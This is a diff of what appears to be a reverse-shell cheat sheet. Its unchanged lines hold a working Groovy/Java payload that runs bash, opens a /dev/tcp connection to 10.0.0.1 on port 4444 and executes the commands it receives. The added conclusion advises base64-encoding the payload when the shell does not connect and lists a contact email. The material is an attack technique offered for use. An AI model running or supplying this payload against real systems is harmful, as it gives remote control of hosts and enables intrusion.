@@ -57,3 +57,8 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+
+## Conclusion
+Sometimes, getting a reverse shell back on our listener requires more work; if you still don't have success getting a reverse shell, it's possible that the payload sending the command for getting the rev shell needs to be encoded with something like base64 or base64url. If you have any questions on that subject, don't hesitate to pm me.
+
+E-mail: syriusbughunt@protonmail.com
